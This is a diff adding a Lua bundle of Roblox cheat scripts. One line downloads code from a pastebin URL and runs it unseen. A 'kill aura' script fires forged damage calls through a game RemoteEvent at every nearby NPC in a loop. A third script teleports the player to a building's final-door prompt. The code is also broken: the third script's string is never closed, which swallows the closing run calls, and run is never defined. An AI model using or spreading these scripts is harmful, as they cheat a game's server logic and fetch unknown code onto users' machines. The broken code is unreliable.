@@ -1,0 +1,270 @@
+local script1 = [[
+loadstring(game:HttpGet("https://pastebin.com/raw/TV83kUPv", true))()
+]]
+
+local script2 = [[
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+local LocalPlayer = Players.LocalPlayer
+
+--========================================================
+-- KILL AURA CONFIG
+--========================================================
+
+local KILL_AURA_ENABLED = true
+local RANGE = 250
+local DAMAGE = 1000
+local INTERVAL = 0.2
+
+--========================================================
+-- FIND REMOTE
+--========================================================
+
+local remoteEvent
+
+local function getRemote()
+    if remoteEvent and remoteEvent.Parent then
+        return remoteEvent
+    end
+
+    local flowClient = ReplicatedStorage:FindFirstChild("FlowClient")
+
+    if flowClient then
+        local clientRunner = flowClient:FindFirstChild("ClientRunner")
+
+        if clientRunner then
+            local event = clientRunner:FindFirstChild("Event")
+
+            if event and (
+                event:IsA("RemoteEvent")
+                or event:IsA("UnreliableRemoteEvent")
+            ) then
+                remoteEvent = event
+                return remoteEvent
+            end
+        end
+    end
+
+    for _, obj in ipairs(ReplicatedStorage:GetDescendants()) do
+        if obj.Name == "Event"
+            and (
+                obj:IsA("RemoteEvent")
+                or obj:IsA("UnreliableRemoteEvent")
+            ) then
+
+            remoteEvent = obj
+            return remoteEvent
+        end
+    end
+
+    return nil
+end
+
+--========================================================
+-- CHARACTER ROOT
+--========================================================
+
+local function getRoot(character)
+    if not character then
+        return nil
+    end
+
+    return character:FindFirstChild("HumanoidRootPart")
+        or character:FindFirstChild("Torso")
+        or character.PrimaryPart
+end
+
+--========================================================
+-- DAMAGE NPCS
+--========================================================
+
+local function executeKillAura()
+
+    if not KILL_AURA_ENABLED then
+        return
+    end
+
+    local character = LocalPlayer.Character
+    local root = getRoot(character)
+
+    if not root then
+        return
+    end
+
+    local npcFolder = workspace:FindFirstChild("NPCs")
+
+    if not npcFolder then
+        return
+    end
+
+    local remote = getRemote()
+
+    if not remote then
+        warn("[Kill Aura] Damage remote not found")
+        return
+    end
+
+    local rootPosition = root.Position
+
+    for _, npc in ipairs(npcFolder:GetChildren()) do
+
+        if npc:IsA("Model") then
+
+            local humanoid = npc:FindFirstChildOfClass("Humanoid")
+
+            local npcRoot =
+                npc:FindFirstChild("HumanoidRootPart")
+                or npc.PrimaryPart
+                or npc:FindFirstChildWhichIsA("BasePart")
+
+            if humanoid
+                and npcRoot
+                and humanoid.Health > 0 then
+
+                local distance =
+                    (npcRoot.Position - rootPosition).Magnitude
+
+                if distance <= RANGE then
+
+                    pcall(function()
+                        remote:FireServer(
+                            "NPCs",
+                            "Damage",
+                            humanoid,
+                            DAMAGE
+                        )
+                    end)
+
+                end
+            end
+        end
+    end
+end
+
+--========================================================
+-- AUTOMATIC LOOP
+--========================================================
+
+task.spawn(function()
+
+    print("[Kill Aura] Enabled")
+    print("[Kill Aura] Range:", RANGE)
+    print("[Kill Aura] Damage:", DAMAGE)
+
+    while KILL_AURA_ENABLED do
+        executeKillAura()
+        task.wait(INTERVAL)
+    end
+
+end)
+
+print("[Kill Aura] Loaded")
+]]
+
+local script3 = [[
+local Players = game:GetService("Players")
+
+local player = Players.LocalPlayer
+
+--========================================================
+-- CONFIG
+--========================================================
+
+-- Your known approximate location
+local START_POSITION = Vector3.new(
+	701.421,
+	2011.231,
+	83592.812
+)
+
+-- How high above the Activate prompt to place the player
+local PROMPT_OFFSET = Vector3.new(0, 3, 0)
+
+--========================================================
+-- CHARACTER
+--========================================================
+
+local function getCharacter()
+	local character = player.Character or player.CharacterAdded:Wait()
+	local root = character:WaitForChild("HumanoidRootPart")
+	return character, root
+end
+
+local character, root = getCharacter()
+
+--========================================================
+-- STEP 1: GO TO APPROXIMATE COORDINATES
+--========================================================
+
+character:PivotTo(CFrame.new(START_POSITION))
+
+root.AssemblyLinearVelocity = Vector3.zero
+root.AssemblyAngularVelocity = Vector3.zero
+
+print("Step 1: Teleported near destination")
+
+--========================================================
+-- STEP 2: WAIT FOR ACTIVATE PROMPT
+--========================================================
+
+local prompt
+
+repeat
+	prompt = workspace
+		:FindFirstChild("Map")
+		and workspace.Map:FindFirstChild("Buildings")
+		and workspace.Map.Buildings:FindFirstChild("CustomsFinal")
+		and workspace.Map.Buildings.CustomsFinal:FindFirstChild("CustomsBuilding")
+		and workspace.Map.Buildings.CustomsFinal.CustomsBuilding:FindFirstChild("FinalDoor")
+		and workspace.Map.Buildings.CustomsFinal.CustomsBuilding.FinalDoor:FindFirstChild("Command")
+		and workspace.Map.Buildings.CustomsFinal.CustomsBuilding.FinalDoor.Command:FindFirstChild("CommandButton")
+		and workspace.Map.Buildings.CustomsFinal.CustomsBuilding.FinalDoor.Command.CommandButton:FindFirstChild("Prompt")
+		and workspace.Map.Buildings.CustomsFinal.CustomsBuilding.FinalDoor.Command.CommandButton.Prompt:FindFirstChild("ProximityPrompt")
+
+	if not prompt then
+		task.wait(0.1)
+	end
+until prompt
+
+print("Step 2: Activate prompt loaded")
+
+--========================================================
+-- STEP 3: GET PROMPT POSITION
+--========================================================
+
+local targetPosition
+
+if prompt.Parent:IsA("BasePart") then
+	targetPosition = prompt.Parent.Position
+elseif prompt.Parent:IsA("Attachment") then
+	targetPosition = prompt.Parent.WorldPosition
+else
+	targetPosition = prompt.Parent:GetPivot().Position
+end
+
+--========================================================
+-- STEP 4: TELEPORT TO ACTIVATE
+--========================================================
+
+character, root = getCharacter()
+
+character:PivotTo(
+	CFrame.new(targetPosition + PROMPT_OFFSET)
+)
+
+root.AssemblyLinearVelocity = Vector3.zero
+root.AssemblyAngularVelocity = Vector3.zero
+
+print("Step 3: Teleported to Activate prompt")
+print("Activate position:", targetPosition)
+  
+--========================================================
+-- START EVERYTHING
+--========================================================
+
+run(script1, "Script 1")
+run(script2, "Script 2")
+run(script3, "Script 3")
+
+print("All scripts finished")
